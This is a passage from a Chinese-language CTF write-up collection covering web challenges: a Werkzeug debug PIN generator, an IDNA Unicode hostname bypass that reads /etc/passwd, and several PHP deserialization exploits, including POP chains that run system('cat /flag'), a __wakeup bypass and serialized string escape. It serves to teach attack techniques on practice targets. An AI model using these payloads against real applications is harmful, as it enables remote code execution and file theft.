/etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n</code></pre> <p>\u8f93\u5165 PIN \u7801\u540e\u53ef\u83b7\u53d6\u4ea4\u4e92\u5f0f shell</p> <p></p>"},{"location":"Web/Chapter11/11-9/","title":"Unicdoe \u7f16\u7801\u7ed5\u8fc7","text":""},{"location":"Web/Chapter11/11-9/#unicdoe-\u7f16\u7801\u7ed5\u8fc7","title":"Unicdoe \u7f16\u7801\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u4ee3\u7801</p> <pre><code>@app.route('/getUrl', methods=['GET', 'POST'])\n\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"\u6211\u624c your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"\u6211\u624c your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    # \u53bb\u6389 url \u4e2d\u7684\u7a7a\u683c\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"\u6211\u624c your problem? 333\"\n</code></pre> <p>\u5229\u7528\u70b9\u5728\u8fd9\u91cc <code>urllib.request.urlopen(finalUrl).read()</code>\uff0c\u53ea\u8981\u524d\u4e24\u6b21 <code>host != suctf.cc</code>\uff0c\u7b2c\u4e09\u6b21 <code>host == suctf.cc</code> \u5373\u53ef</p> <p>\u800c\u8fd9\u5229\u7528\u7684\u5173\u952e\u5728\u4e8e <code>newhost.append(h.encode('idna').decode('utf-8'))</code> \u7f16\u7801\u95ee\u9898\uff0c<code>Unicode</code> \u7684\u5f88\u591a\u5b57\u7b26\u7ecf\u8fc7\u8fd9\u6837\u7684\u4e00\u756a\u7f16\u7801\u5904\u7406\u90fd\u53ef\u4ee5\u5f97\u5230\u6b63\u5e38\u7684\u5b57\u6bcd</p> <pre><code>chars = ['s', 'u', 'c', 't', 'f']\nfor c in chars:\n    for i in range(0x7f, 0x10FFFF):\n        try:\n            char_i = chr(i).encode('idna').decode('utf-8')\n            if char_i == c:\n                print('ASCII: {}   Unicode: {}    Number: {}'.format(c, chr(i), i))\n        except:\n            pass\n</code></pre> <p></p> <p>\u4efb\u610f\u53bb\u4e00\u4e2a\u66ff\u6362 <code>['s', 'u', 'c', 't', 'f']</code> \u5176\u4e2d\u4e00\u4e2a\u5373\u53ef\u7ed5\u8fc7</p> <pre><code>/getUrl?url=file://\ud835\udc46uctf.cc/etc/passwd\n</code></pre> <p></p> <p>\u7136\u540e\u662f\u627e flag \u4f4d\u7f6e\uff0c\u5728 <code>Nginx</code> \u7684\u914d\u7f6e\u6587\u4ef6\u4e2d</p> <pre><code>/getUrl?url=file://\ud835\udc46uctf.cc/usr/local/nginx/conf/nginx.conf\n</code></pre> <p></p> <pre><code>/getUrl?url=file://\ud835\udc46uctf.cc/usr/fffffflag\n</code></pre> <p></p>"},{"location":"Web/Chapter12/12-1/","title":"PHP \u5b57\u7b26\u4e32\u5e8f\u5217\u5316","text":""},{"location":"Web/Chapter12/12-1/#php-\u5b57\u7b26\u4e32\u5e8f\u5217\u5316","title":"PHP \u5b57\u7b26\u4e32\u5e8f\u5217\u5316","text":"<p>\u6253\u5f00\u7f51\u9875\u767b\u5f55\u754c\u9762\uff0c\u9898\u76ee\u8bf4\u767b\u5f55\u4e0d\u8fdb\u53bb\uff0c\u5c1d\u8bd5\u627e\u627e\u5176\u4ed6\u7ebf\u7d22</p> <p></p> <p>\u5728 CSS \u6587\u4ef6\u4e2d\u627e\u5230\u6ce8\u91ca</p> <p></p> <p>URL \u8ddf\u4e0a\u53c2\u6570\u62ff\u5230\u6e90\u7801</p> <p>\u6211\u4eec\u5728 Cookie \u7684 BUGKU \u53c2\u6570\u4e2d\u4f20\u5165\u5e8f\u5217\u5316\u540e\u7684\u503c</p> <p></p> <p>\u627e\u4e2a\u5728\u7ebf\u751f\u6210\u7684\u7f51\u7ad9\u5373\u53ef</p> <p></p> <p>BurpSuite \u62e6\u622a\u6293\u5305\u4fee\u6539\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter12/12-10/","title":"PHP \u53cd\u5e8f\u5217\u5316\u4e4b __toString() \u9b54\u672f\u65b9\u6cd5","text":""},{"location":"Web/Chapter12/12-10/#php-\u53cd\u5e8f\u5217\u5316\u4e4b-__tostring-\u9b54\u672f\u65b9\u6cd5","title":"PHP \u53cd\u5e8f\u5217\u5316\u4e4b __toString() \u9b54\u672f\u65b9\u6cd5","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u6e90\u7801</p> <p></p> <pre><code>class GIT {\n    public $username;\n    public $password;\n    // \u521d\u59cb\u5316\u7528\u6237\u540d\u4e3a 'guest'\uff0c\u5bc6\u7801\u4e3a 'Welcome to GITCTF!'\n    public function __construct(){\n        $this-&gt;username = 'guest';\n        $this-&gt;password = 'Welcome to GITCTF!';\n    }\n    // \u5982\u679c\u7528\u6237\u540d\u4e3a 'ZeroZone'\uff0c\u5219\u8f93\u51fa\u5bc6\u7801\uff1b\u5426\u5219\u8f93\u51fa\u63d0\u793a\u4fe1\u606f\n    public function __destruct(){\n        if($this-&gt;username == 'ZeroZone'){\n            echo $this-&gt;password;\n        }\n        else{\n            echo 'ZeroZone Lab new bee !';\n        }\n    }\n}\n</code></pre> <pre><code>class ZeroZone {\n    public $code;\n    // \u5f53\u5bf9\u8c61\u88ab\u5f53\u4f5c\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u81ea\u52a8\u8c03\u7528\n    public function __toString(){\n        if(isset($this-&gt;code)){\n            eval($this-&gt;code);\n            return '';\n        }\n        else{\n            echo \"\u4ee3\u7801\u5462\uff1f\";\n            return '';\n        }\n    }\n}\n</code></pre> <pre><code>// \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 GIT \u7c7b\u5b9e\u4f8b\n$data = new GIT();\nif(isset($_POST['data'])){\n    $data = unserialize($_POST['data']);\n}\n</code></pre> <p>\u8ba9 <code>$data-&gt;username == 'ZeroZone'</code>\uff0c\u5e76\u8ba9 <code>$data-&gt;password</code></p> <p>\u7531\u4e8e <code>__destruct()</code> \u4f1a\u8f93\u51fa <code>$data-&gt;password</code>\uff0c\u5982\u679c\u80fd\u8ba9 <code>$data-&gt;password</code> \u4e3a\u4e00\u4e2a <code>ZeroZone</code> \u5bf9\u8c61\uff0c\u5e76\u4e14\u89e6\u53d1 <code>__toString()</code>\uff0c\u5c31\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801</p> <pre><code>&lt;?php\nclass GIT {\n    public $username;\n    public $password;\n}\n\nclass ZeroZone {\n    public $code;\n}\n\n// \u6784\u9020\u6076\u610f\u5bf9\u8c61\u94fe\n$zero = new ZeroZone();\n$zero-&gt;code = \"system('cat /flag');\";\n\n$git = new GIT();\n// \u89e6\u53d1\u5bc6\u7801\u8f93\u51fa\u6761\u4ef6\n$git-&gt;username = 'ZeroZone';\n// \u89e6\u53d1__toString() \u65b9\u6cd5\n$git-&gt;password = $zero;\n\n// \u751f\u6210payload\necho serialize($git);\n?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter12/12-11/","title":"PHP & \u5f15\u7528\u76f8\u540c\u5185\u5b58","text":""},{"location":"Web/Chapter12/12-11/#php--\u5f15\u7528\u76f8\u540c\u5185\u5b58","title":"PHP &amp; \u5f15\u7528\u76f8\u540c\u5185\u5b58","text":"<p>\u6253\u5f00\u9776\u573a\u7ed9\u51fa\u6e90\u7801</p> <pre><code>&lt;?php\n/**\n * Created by PhpStorm.\n * User: jinzhao\n * Date: 2019/10/6\n * Time: 8:04 PM\n */\n\nhighlight_file(__FILE__);\n\nclass BUU {\n   public $correct = \"\";\n   public $input = \"\";\n\n   public function __destruct() {\n       try {\n           $this-&gt;correct = base64_encode(uniqid());\n           if($this-&gt;correct === $this-&gt;input) {\n               echo file_get_contents(\"/flag\");\n           }\n       } catch (Exception $e) {\n       }\n   }\n}\n\nif($_GET['pleaseget'] === '1') {\n    if($_POST['pleasepost'] === '2') {\n        if(md5($_POST['md51']) == md5($_POST['md52']) &amp;&amp; $_POST['md51'] != $_POST['md52']) {\n            unserialize($_POST['obj']);\n        }\n    }\n}\n</code></pre> <p>md5 \u7ed5\u8fc7\u5f88\u7b80\u5355\uff0c\u79d1\u5b66\u8ba1\u6570\u6cd5\u53ca\u6570\u7ec4\u7ed5\u8fc7\u90fd\u53ef\u4ee5</p> <p>\u8fd9\u624d\u6765\u5230\u6700\u5173\u952e\u7684\u5730\u65b9\uff0c\u5982\u4f55\u5728\u5e8f\u5217\u5316\u524d\u8ba9 <code>$this-&gt;correct === $this-&gt;input</code>  \u5462\uff1f</p> <p>\u6211\u4eec\u521b\u5efa BUU \u7c7b\u540e\uff0c\u91cd\u65b0\u7ed9 $this-&gt;correct \u8d4b\u503c\u6210 $this-&gt;input \u7684\u503c</p> <p>\u5728 PHP \u4e2d\uff0c<code>&amp;</code> \u8868\u793a**\u5f15\u7528\u8d4b\u503c**\uff0c\u6548\u679c\u662f\uff1a</p> <p>\u4e24\u4e2a\u53d8\u91cf\u6216\u8005\u5c5e\u6027\u540c\u65f6\u6307\u5411\u540c\u4e00\u5757\u5185\u5b58\uff0c\u4efb\u4f55\u4e00\u65b9\u53d8\u5316\uff0c\u53e6\u4e00\u65b9\u7acb\u523b\u540c\u6b65\u53d8\u5316</p> <pre><code>&lt;?php\nclass BUU {\n   public $correct;\n   public $input;\n}\n\n$fun = new BUU();\n// \u8ba9 $b1-&gt;correct \u548c $b1-&gt;input \u4e24\u4e2a\u5c5e\u6027\u5f15\u7528\u540c\u4e00\u5757\u5185\u5b58\u5730\u5740\uff0c\u5373\uff1a\u5b83\u4eec\u4e24\u4e2a\u7ed1\u5b9a\u4e3a\u540c\u4e00\u4e2a\u53d8\u91cf\n$fun-&gt;input = &amp;$fun-&gt;correct;\n$res = serialize(@$fun);\necho $res;\n?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter12/12-2/","title":"PHP POP \u94fe","text":""},{"location":"Web/Chapter12/12-2/#php-pop-\u94fe","title":"PHP POP \u94fe","text":"<pre><code>__call() \u9b54\u672f\u65b9\u6cd5\uff1a\u5f53\u8c03\u7528\u5bf9\u8c61\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\uff0c\u4f1a\u89e6\u53d1\u8be5\u65b9\u6cd5\n\n__wakeup() \u9b54\u672f\u65b9\u6cd5\uff1a\u5f53\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u89e6\u53d1\u8be5\u65b9\u6cd5\u7ec8\u6b62\u811a\u672c\u6267\u884c\n\n__invoke() \u9b54\u672f\u65b9\u6cd5\uff1a\u5141\u8bb8\u5bf9\u8c61\u4f5c\u4e3a\u51fd\u6570\u88ab\u8c03\u7528\n\n__set() \u9b54\u672f\u65b9\u6cd5\uff1a\u5f53\u7ed9\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u8d4b\u503c\u65f6\u4f1a\u89e6\u53d1\n\n__get() \u9b54\u672f\u65b9\u6cd5\uff1a\u5f53\u8bbf\u95ee\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u65f6\u4f1a\u89e6\u53d1 __destruct\n\n__construct() \u6784\u9020\u51fd\u6570\uff1a\u5728\u5bf9\u8c61\u88ab\u5b9e\u4f8b\u5316\u540e\u7acb\u5373\u6267\u884c\n\n__destruct() \u9b54\u672f\u65b9\u6cd5\uff1a\u5f53\u5bf9\u8c61\u751f\u547d\u5468\u671f\u7ed3\u675f\u65f6\u81ea\u52a8\u89e6\u53d1\n\n__toString() \u9b54\u672f\u65b9\u6cd5\uff1a\u5f53\u5bf9\u8c61\u88ab\u5f53\u4f5c\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u81ea\u52a8\u8c03\u7528\n</code></pre> <pre><code>&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass Happy{\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content)\n    {\n        $this-&gt;cmd = $cmd;\n        $this-&gt;content = $content;\n    }\n\n    public function __call($name, $arguments)\n    {\n        call_user_func($this-&gt;cmd, $this-&gt;content);\n    }\n\n    public function __wakeup()\n    {\n        die(\"Wishes can be fulfilled\");\n    }\n}\n\nclass Nevv{\n    private $happiness;\n\n    public function __invoke()\n    {\n        return $this-&gt;happiness-&gt;check();\n    }\n\n}\n\nclass Rabbit{\n    private $aspiration;\n\n    public function __set($name,$val){\n        return $this-&gt;aspiration-&gt;family;\n    }\n}\n\nclass Year{\n    public $key;\n    public $rabbit;\n\n    public function __construct($key)\n    {\n        $this-&gt;key = $key;\n    }\n\n    public function firecrackers()\n    {\n        return $this-&gt;rabbit-&gt;wish = \"allkill QAQ\";\n    }\n\n    public function __get($name)\n    {\n        $name = $this-&gt;rabbit;\n        $name();\n    }\n\n    public function __destruct()\n    {\n        if ($this-&gt;key == \"happy new year\") {\n            $this-&gt;firecrackers();\n        }else{\n            print(\"Welcome 2023!!!!!\");\n        }\n    }\n}\n\nif (isset($_GET['pop'])) {\n    $a = unserialize($_GET['pop']);\n}else {\n    echo \"\u8fc7\u65b0\u5e74\u554a~\u8fc7\u4e2a\u5409\u7965\u5e74~\";\n}\n?&gt;\n</code></pre> <p>\u9996\u5148\u4f20\u5165 Year \u4e2d\u7684 $key=\"happy new year\"</p> <p>\u6761\u4ef6\u6210\u7acb\u8c03\u7528 firecrackers \u65b9\u6cd5</p> <p>\u4f46 Rabbit \u4e2d wish \u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u8c03\u7528 get \u9b54\u6cd5\u65b9\u6cd5</p> <p>\u6b64\u65f6 $name() \u5bf9\u8c61\u88ab\u5f53\u6210\u51fd\u6570\u8bbf\u95ee\uff0c\u7c7b\u578b\u5b9e\u9645\u4e0a\u662f Rabbit \u5bf9\u8c61</p> <p>\u4f46 invoke \u65b9\u6cd5\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86 Nevv</p> <p>\u56e0\u4e3a check() \u662f\u4e2a\u65b9\u6cd5\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u8c03\u7528\u4e86 call \u65b9\u6cd5</p> <p>$a \u548c \\(b \u662f\u4e24\u4e2a Year \u5bf9\u8c61\uff0c\\)c \u662f\u4e00\u4e2a Rabbit \u5bf9\u8c61</p> <p>\u5b83\u7684\u6784\u9020\u51fd\u6570\u63a5\u53d7 $b\uff08\u53e6\u4e00\u4e2a Year \u5bf9\u8c61\uff09\u4f5c\u4e3a\u53c2\u6570</p> <p>\u8fd9\u610f\u5473\u7740 Rabbit \u5bf9\u8c61 $c \u4f1a\u6301\u6709 $b \u5bf9\u8c61</p> <p>$e \u662f\u4e00\u4e2a Happy \u5bf9\u8c61\u7528\u4e8e\u6267\u884c\u7cfb\u7edf\u547d\u4ee4</p> <p>\u5c06 Rabbit \u5bf9\u8c61 $c \u8d4b\u503c\u7ed9 $a-&gt;rabbit</p> <p>\u5c06 Nevv \u5bf9\u8c61 $d \u8d4b\u503c\u7ed9 $b-&gt;rabbit</p> <p>\u5c06 Nevv \u5bf9\u8c61 $d \u8d4b\u503c\u7ed9 $b-&gt;rabbit</p> <p>Year \u5bf9\u8c61\u7684 $rabbit \u5c5e\u6027\u4f1a\u88ab\u8d4b\u503c\u4e3a Rabbit \u5bf9\u8c61</p> <p>\u800c Rabbit \u5bf9\u8c61\u7684 $aspiration \u5c5e\u6027\u4f1a\u88ab\u8d4b\u503c\u4e3a Year \u5bf9\u8c61\uff0c\u4f9d\u6b64\u7c7b\u63a8</p> <pre><code>&lt;?php\n\nclass Happy\n{\n    private $cmd = \"system\";\n    private $content = \"cat /flag\";\n}\n\nclass Nevv\n{\n    private $happiness;\n\n    public function __construct($happiness)\n    {\n        $this-&gt;happiness = $happiness;\n    }\n}\n\nclass Rabbit\n{\n    private $aspiration;\n\n    public function __construct($aspiration)\n    {\n        $this-&gt;aspiration = $aspiration;\n    }\n\n    public function __set($name, $val)\n    {\n        return @$this-&gt;aspiration-&gt;family;\n    }\n}\n\nclass Year\n{\n    public $key = \"happy new year\";\n    public $rabbit;\n}\n\n$result = new Year();\n$year1  = new Year();\n$year1-&gt;rabbit = new Nevv(new Happy());\n$rabbit1 = new Rabbit($year1);\n$result-&gt;rabbit = $rabbit1;\n$rabbit1-&gt;aspiration = 1;\n\n$result=serialize($result);\necho urlencode($result);\n</code></pre> <pre><code>Year::__destruct()\n    \u2514\u2500\u2500 firecrackers()\n         \u2514\u2500\u2500 Rabbit::__set(\"wish\", \"allkill QAQ\")\n              \u2514\u2500\u2500 aspiration-&gt;family   (aspiration \u662f Year)\n                   \u2514\u2500\u2500 Year::__get(\"family\")\n                        \u2514\u2500\u2500 this-&gt;rabbit()  (rabbit \u662f Nevv)\n                             \u2514\u2500\u2500 Nevv::__invoke()\n                                  \u2514\u2500\u2500 happiness-&gt;check() (happiness \u662f Happy)\n                                       \u2514\u2500\u2500 Happy::__call(\"check\", [])\n                                            \u2514\u2500\u2500 call_user_func($cmd, $content)\n</code></pre> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter12/12-3/","title":"PHP \u4e2a\u6570\u4e0d\u7b49\u7ed5\u8fc7__wakeup()","text":""},{"location":"Web/Chapter12/12-3/#php-\u4e2a\u6570\u4e0d\u7b49\u7ed5\u8fc7__wakeup","title":"PHP \u4e2a\u6570\u4e0d\u7b49\u7ed5\u8fc7__wakeup()","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u5907\u4efd\u63d0\u793a</p> <p></p> <p>\u626b\u540e\u53f0\u53d1\u73b0 ZIP \u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u4e0b\u6765\u6253\u5f00 index.php \u62ff\u5230\u6e90\u7801\uff08flag.php \u662f\u5047\u7684\uff09</p> <p></p> <p>\u770b\u5230\u4e86\u53cd\u5e8f\u5217\u5316\uff0c\u63a5\u4e0b\u6765\u53bb\u770b class.php</p> <pre><code>__wakeup \u9b54\u672f\u65b9\u6cd5\uff1a\u5f53\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u89e6\u53d1\u8be5\u65b9\u6cd5\u7ec8\u6b62\u811a\u672c\u6267\u884c\n\n__destruct \u6790\u6784\u51fd\u6570\uff1a\u5f53\u5bf9\u8c61\u9500\u6bc1\u65f6\u8c03\u7528\n</code></pre> <pre><code>&lt;?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n\n    function __wakeup(){\n        $this-&gt;username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this-&gt;password != 100) {\n            echo \"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\";\n            echo \"You name is: \";\n            echo $this-&gt;username;echo \"&lt;/br&gt;\";\n            echo \"You password is: \";\n            echo $this-&gt;password;echo \"&lt;/br&gt;\";\n            die();\n        }\n        if ($this-&gt;username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\";\n            die();\n\n\n        }\n    }\n}\n?&gt;\n</code></pre> <p>\u6211\u4eec\u9700\u8981\u4f20\u5165 username = admin\uff0cpassword = 100\uff0c\u4e8e\u662f\u6784\u9020\u53cd\u5e8f\u5217\u5316</p> <pre><code>&lt;?php\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n}\n$a = new Name('admin', 100);\nvar_dump(serialize($a));\n\n?&gt;\n</code></pre> <p>\u8fd8\u6ca1\u6709\u7ed3\u675f\uff0c\u56e0\u4e3a\u7c7b\u7684\u4e24\u4e2a\u5c5e\u6027\u58f0\u660e\u4e3a private\uff0c\u53ea\u5728\u6240\u58f0\u660e\u7684\u7c7b\u4e2d\u53ef\u89c1\uff0c\u5728\u8be5\u7c7b\u7684\u5b50\u7c7b\u548c\u8be5\u7c7b\u7684\u5bf9\u8c61\u5b9e\u4f8b\u4e2d\u5747\u4e0d\u53ef\u89c1</p> <p>\u6240\u4ee5\u8981\u5728\u6b64\u57fa\u7840\u4e0a\u8865\u4e0a %00 \u7684\u7a7a\u5b57\u7b26</p> <pre><code>%00Name%00username\n\n%00Name%00password\n</code></pre> <p>\u6700\u540e\u662f\u7ed5\u8fc7 __wakeup()</p> <p>\u5f53\u53cd\u5e8f\u5217\u5316\u4e2d\u5bf9\u8c61\u5c5e\u6027\u7684\u4e2a\u6570\u548c\u771f\u5b9e\u7684\u4e2a\u6570\u4e0d\u7b49\u65f6\uff0c__wakeup() \u5c31\u4f1a\u88ab\u7ed5\u8fc7\uff0c\u6240\u4ee5\u4fee\u6539\u4f7f\u5176\u4e0d\u76f8\u7b49\u5373\u53ef</p> <pre><code>?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n</code></pre> <p></p>"},{"location":"Web/Chapter12/12-4/","title":"PHP \u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038","text":""},{"location":"Web/Chapter12/12-4/#php-\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038","title":"PHP \u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038","text":"<p>\u6253\u5f00\u7f51\u9875\u62ff\u5230\u6e90\u7801</p> <pre><code>&lt;?php\n// \u9700\u8981\u4ee5 get \u65b9\u5f0f\u4f20\u5165f\u53c2\u6570\n$function = @$_GET['f'];\n\n// \u5bf9 $img\uff08\u5f62\u53c2\uff09\u8fdb\u884c\u8fc7\u6ee4\uff0c\u540e\u7f00\u4e0d\u5141\u8bb8\u51fa\u73b0 'php','flag','php5','php4','fl1g'\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n// unset() \u9500\u6bc1\u6307\u5b9a\u7684\u53d8\u91cf\u3002 \nif($_SESSION){\n    unset($_SESSION);\n}\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\n// \u672c\u9898\u7684\u4f5c\u7528\u662f\u5c06 _SESSION \u7684\u4e24\u4e2a\u51fd\u6570\u53d8\u4e3a post \u4f20\u53c2\nextract($_POST);\n\nif(!$function){\n    echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';\n}\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n// \u5bf9$_SESSION\u8fdb\u884c\u4e00\u4e9b\u8fc7\u6ee4\n$serialize_info = filter(serialize($_SESSION));\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n</code></pre> <p>\u9996\u5148\u8ba9\u53c2\u6570f\u7b49\u4e8e \u201cphpinfo\u201d\uff0c\u56e0\u4e3a\u9898\u76ee\u63d0\u793a\u8bf4\u8fd9\u91cc\u53ef\u80fd\u4f1a\u627e\u5230\u4e9b\u4e1c\u897f</p> <p></p> <p>\u5f88\u660e\u663e\u662f\u8981\u8bfb\u53d6\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4ee3\u7801\u91cc\u8bfb\u53d6\u6587\u4ef6\u7684\u5730\u65b9\u5728\u8fd9\u91cc</p> <pre><code>if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n</code></pre> <p>\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u9003\u9038\u7684\u539f\u7406\uff1a</p> <pre><code>\u5728\u6784\u9020\u952e\u503c\u7684\u65f6\u5019\u67d0\u4e9b\u5173\u952e\u5b57\u88ab\u8fc7\u6ee4\u6389\u4e86\uff0c\u4f46\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32\u8bb0\u5f55\u7684\u957f\u5ea6\u4e0d\u4f1a\u56e0\u4e3a\u8fc7\u6ee4\u800c\u6539\u53d8\uff0c\u6240\u4ee5\u5c31\u4f1a\u628a\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32\u7684\u7ed3\u6784\u5f53\u505a\u503c\u7684\u5185\u5bb9\u7ed9\u8bfb\u53d6\n</code></pre> <p>\u9996\u5148\u5eb7\u5eb7\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u957f\u5565\u6837</p> <pre><code>&lt;?php\n$_SESSION[\"user\"] = '*';\n$_SESSION['function'] = '**';\n$_SESSION['img'] = base64_encode('guest_img.png');\necho serialize($_SESSION);\n\n// a:3:{s:4:\"user\";s:1:\"*\";s:8:\"function\";s:2:\"**\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\n</code></pre> <p>\u90a3\u4e48\u6211\u4eec\u5982\u679c\u60f3\u8981\u8bfb\u53d6 <code>d0g3_f1ag.php</code> \u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u9700\u8981\u4ee4\u53cd\u5e8f\u5217\u5316\u540e\u7684</p> <pre><code>$_SESSION['img'] \u4e3a d0g3_f1ag.php =&gt; ZDBnM19mMWFnLnBocA==\n</code></pre> <p>\u5219\u521d\u6b65\u53cd\u5e8f\u5217\u5316\u5185\u5bb9</p> <pre><code>s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";\n</code></pre> <p>\u518d\u770b\u5230 <code>$serialize_info = filter(serialize($_SESSION));</code></p> <p>\u5148\u7ecf\u8fc7\u5e8f\u5217\u5316\uff0c\u7136\u540e\u5728\u8fdb\u884c <code>filter</code> \u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u8fc7\u6ee4\u66ff\u6362\u64cd\u4f5c</p> <p>\u8fd9\u6837\u7684\u8bdd\u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u9020\u6210\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u9003\u9038\u7684\u95ee\u9898</p> <p>\u9996\u5148\u9ed8\u8ba4\u7684\u5e8f\u5217\u5316\u6570\u636e\u662f</p> <pre><code>a:3:{s:4:\"user\";s:5:\"guest\";s:8:\"function\";s:14:\"highlight_file\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\n</code></pre> <p>\u8fd9\u91cc\u53ef\u4ee5\u63a7\u5236\u7684\u90e8\u5206\u662f user \u548c function \u7684\u5185\u5bb9</p> <p>\u4e8e\u662f\u8981\u5229\u7528\u8fc7\u6ee4\uff0c\u7528 user \u5403\u6389\u540e\u9762\u7684\uff0c\u52a0 <code>;</code> \u95ed\u5408\u6389\u524d\u9762\u7684\u952e\u503c <code>function</code></p> <pre><code>;s:8:\"function\";s:14:\n</code></pre> <p>\u4e4b\u540e\u5728 function \u7684\u90e8\u5206\u4fbf\u53ef\u4ee5\u5199\u5165\u6570\u636e\u63a7\u5236\u540e\u9762\u7684\u5185\u5bb9\u4e86</p> <p>\u8981\u5403\u6389\u7684\u6570\u636e\u4e00\u5171\u662f 22 \u4e2a\uff0c\u4e8e\u662f user \u7684\u503c\u4e3a phpphpphpphpphpphpflag</p> <p>_SESSION[function] \u7684\u503c\u4e3a</p> <pre><code>;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:1:\"f\";s:1:\"a\";}\n</code></pre> <p>\u8fd9\u91cc\u8981\u4fdd\u8bc1\u6570\u7ec4\u5185\u7684\u4e2a\u6570\u76f8\u7b49\uff0c\u6240\u4ee5\u8981\u4f20\u5165\u4e24\u4e2a\u503c\uff0c\u4e8e\u662f\u6784\u9020\u5229\u7528 payload</p> <pre><code>_SESSION[user]=flagflagflagflagphpphp&amp;_SESSION[function]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:1:\"f\";s:1:\"a\";}\n</code></pre> <p>\u7531\u4e8e <code>_SESSION</code> \u6570\u7ec4\u6709 3 \u4e2a\u503c\uff0c\u5219\u9700\u8981\u5728\u540e\u9762\u8865\u5145\u968f\u4fbf\u4e00\u4e2a\u503c\u5373\u53ef</p> <p>\u4f20\u5165\u540e <code>$serialize_info</code> \u7684\u5c31\u4e3a\u4ee5\u4e0b\u503c</p> 